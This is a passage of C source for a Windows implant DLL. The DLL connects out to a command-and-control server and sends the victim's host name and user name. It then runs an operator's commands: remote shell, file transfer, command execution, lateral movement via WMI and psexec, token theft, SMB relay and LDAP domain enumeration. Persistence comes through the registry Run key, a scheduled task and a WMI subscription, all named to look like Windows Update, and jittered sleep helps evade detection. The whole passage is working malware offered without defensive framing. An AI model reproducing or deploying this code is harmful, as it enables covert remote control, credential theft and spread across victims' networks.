    LONG ret = RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);

    if (ret == ERROR_SUCCESS) {
        ret = RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ,
                             (BYTE *)fullPath, (DWORD)strlen(fullPath) + 1);
        RegCloseKey(hKey);
        pos += wsprintfA(out + pos, "[+] Registry Run persistence: %s\r\n", fullPath);
    } else {
        pos += wsprintfA(out + pos, "[-] Registry access denied (err=%lu)\r\n", ret);
    }
    Tx(CHAN_CTRL, MSG_PERSIST_OUT, out, pos);
}

// Scheduled Task persistence
static void PersistScheduledTask(const char *payloadPath, const char *taskName) {
    char out[512]; int pos = 0;
    char cmd[2048];
    const char *tn = taskName ? taskName : "WindowsUpdateTask";

    // Create scheduled task to run every hour
    wsprintfA(cmd,
        "cmd.exe /c schtasks /create /tn \"%s\" /tr \"%s\" "
        "/sc hourly /mo 1 /f 2>&1",
        tn, payloadPath);
    RunCommand(cmd);
    pos += wsprintfA(out + pos, "[+] Scheduled task persistence: %s\r\n", tn);
    Tx(CHAN_CTRL, MSG_PERSIST_OUT, out, pos);
}

// WMI Event Subscription persistence
static void PersistWMI(const char *payloadPath) {
    char out[512]; int pos = 0;
    char cmd[2048];

    // Remove old subscription if exists
    wsprintfA(cmd,
        "cmd.exe /c wmic /namespace:\"\\\\root\\subscription\" "
        "PATH __EventFilter WHERE Name=\"WinKillFilter\" DELETE 2>&1");
    RunCommand(cmd);

    // Create event filter (trigger on system startup)
    wsprintfA(cmd,
        "cmd.exe /c wmic /namespace:\"\\\\root\\subscription\" "
        "PATH __EventFilter CREATE "
        "Name=\"WinKillFilter\", "
        "EventNamespace=\"root\\cimv2\", "
        "QueryLanguage=\"WQL\", "
        "Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 "
        "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\" 2>&1");
    RunCommand(cmd);

    Sleep(500);

    // Create event consumer (execute payload)
    wsprintfA(cmd,
        "cmd.exe /c wmic /namespace:\"\\\\root\\subscription\" "
        "PATH CommandLineEventConsumer CREATE "
        "Name=\"WinKillConsumer\", "
        "CommandLineTemplate=\"%s\" 2>&1",
        payloadPath);
    RunCommand(cmd);

    Sleep(500);

    // Bind filter to consumer
    wsprintfA(cmd,
        "cmd.exe /c wmic /namespace:\"\\\\root\\subscription\" "
        "PATH __FilterToConsumerBinding CREATE "
        "Filter=\"__EventFilter.Name=\\\"WinKillFilter\\\"\", "
        "Consumer=\"CommandLineEventConsumer.Name=\\\"WinKillConsumer\\\"\" 2>&1");
    RunCommand(cmd);

    pos += wsprintfA(out + pos, "[+] WMI Event Subscription persistence installed\r\n");
    Tx(CHAN_CTRL, MSG_PERSIST_OUT, out, pos);
}

/* ============================================================
 * RunConfig: update sleep/jitter/shell at runtime
 * ============================================================ */
static void RunConfig(const char *configJSON) {
    char out[256]; int pos = 0;

    // Simple parse: "sleep=5000" "jitter=30" "shell=powershell.exe"
    char *ctx = NULL;
    char *copy = _strdup(configJSON);
    char *token = strtok_s(copy, " ,;", &ctx);

    while (token) {
        if (strncmp(token, "sleep=", 6) == 0) {
            g_sleep_ms = (DWORD)atoi(token + 6);
            pos += wsprintfA(out + pos, "sleep=%lums ", g_sleep_ms);
        }
        else if (strncmp(token, "jitter=", 7) == 0) {
            g_jitter_pct = (DWORD)atoi(token + 7);
            pos += wsprintfA(out + pos, "jitter=%lu%% ", g_jitter_pct);
        }
        else if (strncmp(token, "shell=", 6) == 0) {
            MultiByteToWideChar(CP_UTF8, 0, token + 6, -1, g_shell_host, 64);
            pos += wsprintfA(out + pos, "shell=%S ", g_shell_host);
        }
        token = strtok_s(NULL, " ,;", &ctx);
    }
    free(copy);

    if (pos > 0) {
        out[pos] = '\0';
        Tx(CHAN_CTRL, MSG_CONFIG_OUT, out, pos);
    }
}

/* ============================================================
 * Frame Dispatcher
 * ============================================================ */
static void Dispatch(DWORD ch, BYTE t, BYTE *d, DWORD n) {
    // Shell data -> write to job's stdin
    if ((ch & 0xF0000000) == CHAN_SHELL_B && t == MSG_SHELL_DATA) {
        Job *j = JF(ch);
        if (j && j->on && d) {
            DWORD w;
            WriteFile(j->hi, d, n, &w, NULL);
        }
        if (d) HeapFree(GetProcessHeap(), 0, d);
        return;
    }

    switch (t) {
    case MSG_HEARTBEAT:
        break;

    case MSG_SHUTDOWN:
        g_r = 0;
        break;

    case MSG_SHELL_SPAWN:
        if (n >= 4) {
            DWORD nc = *(DWORD *)d;
            Job *j = SP(nc);
            char r[128];
            int l = wsprintfA(r, "OK shell ch=%08X id=%lu\r\n", nc, j ? j->id : 0);
            Tx(CHAN_CTRL, MSG_STATUS, r, l);
        }
        break;

    case MSG_SHELL_KILL:
        if ((ch & 0xF0000000) == CHAN_SHELL_B) {
            Job *j = JF(ch);
            if (j) JK(j);
        }
        break;

    case MSG_PROC_LIST:
        PS();
        break;

    case MSG_PROC_KILL:
        if (d && n) PK((char *)d);
        break;

    // File download from target
    case MSG_FILE_GET:
        if (d && n) FileDownload((char *)d);
        break;

    // File upload to target
    case MSG_FILE_PUT:
    case MSG_FILE_CHUNK:
        if (d && n) FileUpload(d, n);
        break;

    // Direct command execution (no cmd.exe wrapper!)
    case MSG_EXEC:
        if (d && n) RunCommand((char *)d);
        break;

    // Lateral movement dispatch
    case MSG_LATERAL:
        if (d && n) {
            // Format: "wmi:target:cmd" or "psexec:target:binary:svcname"
            // or "steal:PID" or "steal:DOMAIN\\user"
            char *method = (char *)d;
            char *arg1 = NULL, *arg2 = NULL, *arg3 = NULL;

            // Parse colon-separated
            char *ctx = NULL;
            char *copy = _strdup((char *)d);
            method = strtok_s(copy, ":", &ctx);
            arg1   = strtok_s(NULL,  ":", &ctx);
            arg2   = strtok_s(NULL,  ":", &ctx);
            arg3   = strtok_s(NULL,  ":", &ctx);

            if (method && arg1) {
                if (_stricmp(method, "wmi") == 0) {
                    LateralWMI(arg1, arg2 ? arg2 : "cmd.exe", arg3, NULL);
                } else if (_stricmp(method, "wmipass") == 0 && arg3) {
                    LateralWMI(arg1, arg2, arg3, "pass");  // will parse later
                } else if (_stricmp(method, "psexec") == 0) {
                    LateralPSExec(arg1, arg2, arg3);
                } else if (_stricmp(method, "steal") == 0) {
                    DWORD pid = (DWORD)atoi(arg1);
                    TokenSteal(pid ? NULL : arg1, pid);
                } else if (_stricmp(method, "smb_start") == 0) {
                    SMBRelayStart(arg1);
                } else if (_stricmp(method, "smb_stop") == 0) {
                    SMBRelayStop();
                }
            }
            free(copy);
        }
        break;

    // Domain enumeration dispatch
    case MSG_DOMAIN:
        if (d && n) {
            char *action = (char *)d;
            if (_stricmp(action, "discover") == 0) {
                DomainDiscover();
            } else if (strncmp(action, "ldap:", 5) == 0) {
                // Format: "ldap:baseDN:filter"
                char *baseDN = action + 5;
                char *filter = "(objectClass=*)";
                char *colon = strchr(baseDN, ':');
                if (colon) { *colon = 0; filter = colon + 1; }
                LDAPQuery(baseDN, filter, NULL);
            }
        }
        break;

    // Persistence dispatch
    case MSG_PERSIST:
        if (d && n) {
            char *copy = _strdup((char *)d);
            char *ctx = NULL;
            char *method = strtok_s(copy, ":", &ctx);
            char *path   = strtok_s(NULL,  ":", &ctx);
            char *name   = strtok_s(NULL,  ":", &ctx);

            if (method && path) {
                if (_stricmp(method, "registry") == 0) {
                    PersistRegistry(path);
                } else if (_stricmp(method, "schtask") == 0) {
                    PersistScheduledTask(path, name);
                } else if (_stricmp(method, "wmi") == 0) {
                    PersistWMI(path);
                }
            }
            free(copy);
        }
        break;

    // Runtime configuration
    case MSG_CONFIG:
        if (d && n) RunConfig((char *)d);
        break;
    }

    if (d) HeapFree(GetProcessHeap(), 0, d);
}

/* ============================================================
 * Sleep with jitter
 * ============================================================ */
static void JitterSleep(void) {
    DWORD base = g_sleep_ms;
    // Apply jitter: +/- jitter_pct%
    if (g_jitter_pct > 0 && g_jitter_pct <= 100) {
        // Simple RNG using tick count
        int jitter = (int)(((GetTickCount() * 1103515245 + 12345) & 0x7FFFFFFF) % (base * g_jitter_pct / 50));
        jitter -= (int)(base * g_jitter_pct / 100);
        base = (DWORD)((int)base + jitter);
    }
    if (base < 100) base = 100;
    if (base > 3600000) base = 3600000;  // max 1 hour
    Sleep(base);
}

/* ============================================================
 * Main Agent
 * ============================================================ */
DWORD WINAPI AgentMain(LPVOID param) {
    WSADATA w; WSAStartup(MAKEWORD(2,2), &w);
    InitializeCriticalSection(&g_l);

    g_sk = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    if (g_sk == INVALID_SOCKET) goto done;

    struct sockaddr_in a;
    a.sin_family = AF_INET;
    a.sin_port   = htons(C2_PORT);
    a.sin_addr.s_addr = C2_IP;

    if (connect(g_sk, (struct sockaddr*)&a, sizeof(a)) != 0) {
        closesocket(g_sk); g_sk = INVALID_SOCKET;
        goto done;
    }

    // Set TCP keepalive to detect dead connections
    {
        DWORD keepalive = 1;
        setsockopt(g_sk, SOL_SOCKET, SO_KEEPALIVE, (char*)&keepalive, sizeof(keepalive));
        struct tcp_keepalive ka;
        ka.onoff = 1;
        ka.keepalivetime = 30000;
        ka.keepaliveinterval = 5000;
        DWORD ret;
        WSAIoctl(g_sk, SIO_KEEPALIVE_VALS, &ka, sizeof(ka), NULL, 0, &ret, NULL, NULL);
    }

    // Auto-spawn default shell on channel 1
    SP(CHAN_SHELL(1));

    // Send host info on connect
    {
        char info[512];
        WCHAR host[256], user[256];
        DWORD hostLen = 256, userLen = 256;
        GetComputerNameW(host, &hostLen);
        GetUserNameW(user, &userLen);
        int l = wsprintfA(info, "HOST=%S USER=%S OS=Windows PID=%lu",
                         host, user, GetCurrentProcessId());
        Tx(CHAN_CTRL, MSG_STATUS, info, l);
    }

    // Main loop with connection timeout
    DWORD lr = 0;
    DWORD lastData = GetTickCount();
    while (g_r) {
        struct timeval tv = {0, 100000};  // 100ms
        fd_set f; FD_ZERO(&f); FD_SET(g_sk, &f);

        int sel = select(0, &f, NULL, NULL, &tv);

        if (sel > 0) {
            DWORD ch; BYTE t; BYTE *d; DWORD n;
            if (Rx(&ch, &t, &d, &n) == 0) {
                Dispatch(ch, t, d, n);
                lastData = GetTickCount();
            } else {
                break;
            }
        }

        // Exit if no data for 120s (server dead)
        if (GetTickCount() - lastData > 120000) break;

        if (GetTickCount() - lr > 30000) {
            RP(); lr = GetTickCount();
        }

        // Apply sleep/jitter between polls when idle
        if (sel == 0 && g_sleep_ms > 100) {
            JitterSleep();
        }
    }

done:
    EnterCriticalSection(&g_l);
    Job *j = g_j;
    while (j) { Job *nx = j->nx; JK(j); j = nx; }
    LeaveCriticalSection(&g_l);

    if (g_sk != INVALID_SOCKET) closesocket(g_sk);
    WSACleanup();
    DeleteCriticalSection(&g_l);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID v) {
    if (r == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        CloseHandle(CreateThread(NULL, 0, AgentMain, NULL, 0, NULL));
    }
    return TRUE;
}
